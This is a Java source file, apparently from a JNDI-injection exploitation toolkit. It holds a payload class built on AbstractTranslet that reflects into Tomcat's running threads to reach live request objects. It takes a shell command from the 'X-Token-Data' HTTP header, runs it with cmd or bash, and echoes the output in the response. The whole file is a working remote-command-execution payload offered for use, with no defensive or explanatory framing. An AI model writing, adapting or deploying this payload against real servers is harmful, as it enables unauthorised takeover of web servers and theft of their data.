package com.qi4l.jndi.template.echo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.List;

public class TomcatEchoJndi extends AbstractTranslet {

    public static String CMD_HEADER = "X-Token-Data";

    public TomcatEchoJndi() {
        try {
            boolean flag = false;
            ThreadGroup group = Thread.currentThread().getThreadGroup();
            ClassLoader loader = Thread.currentThread().getContextClassLoader();
            Field       f      = group.getClass().getDeclaredField("threads");
            f.setAccessible(true);
            Thread[] threads = (Thread[])((Thread[])f.get(group));

            for(int i = 0; i < threads.length; ++i) {
                try {
                    Thread t = threads[i];
                    if (t != null) {
                        String str = t.getName();
                        if (!str.contains("exec") && str.contains("http")) {
                            f = t.getClass().getDeclaredField("target");
                            f.setAccessible(true);
                            Object obj = f.get(t);
                            if (obj instanceof Runnable) {
                                f = obj.getClass().getDeclaredField("this$0");
                                f.setAccessible(true);
                                obj = f.get(obj);

                                try {
                                    f = obj.getClass().getDeclaredField("handler");
                                } catch (NoSuchFieldException var19) {
                                    f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                                }

                                f.setAccessible(true);
                                obj = f.get(obj);

                                try {
                                    f = obj.getClass().getSuperclass().getDeclaredField("global");
                                } catch (NoSuchFieldException var18) {
                                    f = obj.getClass().getDeclaredField("global");
                                }

                                f.setAccessible(true);
                                obj = f.get(obj);
                                f = obj.getClass().getDeclaredField("processors");
                                f.setAccessible(true);
                                List processors = (List)((List)f.get(obj));

                                for(int j = 0; j < processors.size(); ++j) {
                                    Object processor = processors.get(j);
                                    f = processor.getClass().getDeclaredField("req");
                                    f.setAccessible(true);
                                    Object req = f.get(processor);
                                    Object resp = req.getClass().getMethod("getResponse").invoke(req);
                                    str = (String)req.getClass().getMethod("getHeader", String.class).invoke(req, CMD_HEADER);
                                    if (str != null && !str.isEmpty()) {
                                        resp.getClass().getMethod("setStatus", Integer.TYPE).invoke(resp, new Integer(200));
                                        ByteArrayOutputStream baos = q(str);

                                        try {
                                            Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk", false, loader);
                                            obj = cls.newInstance();
                                            cls.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(obj, baos.toByteArray(), new Integer(0), baos.toByteArray().length);
                                            resp.getClass().getMethod("doWrite", cls).invoke(resp, obj);
                                        } catch (NoSuchMethodException var17) {
                                            Class cls = Class.forName("java.nio.ByteBuffer", false, loader);
                                            obj = cls.getDeclaredMethod("wrap", byte[].class).invoke(cls, baos.toByteArray());
                                            resp.getClass().getMethod("doWrite", cls).invoke(resp, obj);
                                        }

                                        flag = true;
                                    }

                                    if (flag) {
                                        break;
                                    }
                                }

                                if (flag) {
                                    break;
                                }
                            }
                        }
                    }
                } catch (Exception var20) {
                }
            }
        } catch (Exception var21) {
        }
    }

    public static ByteArrayOutputStream q(String var0) {
        return execCmd(var0);
    }

    public static ByteArrayOutputStream execCmd(String var0) {
        try {
            if (var0 != null && !var0.isEmpty()) {
                String[] var1 = null;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    var1 = new String[]{"cmd", "/c", var0};
                } else {
                    var1 = new String[]{"/bin/bash", "-c", var0};
                }

                InputStream           var2 = Runtime.getRuntime().exec(var1).getInputStream();
                ByteArrayOutputStream var3 = new ByteArrayOutputStream();
                boolean var4 = false;
                byte[] var5 = new byte[1024];

                int var8;
                while((var8 = var2.read(var5)) != -1) {
                    var3.write(var5, 0, var8);
                }

                return var3;
            }
        } catch (Exception var7) {
        }

        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
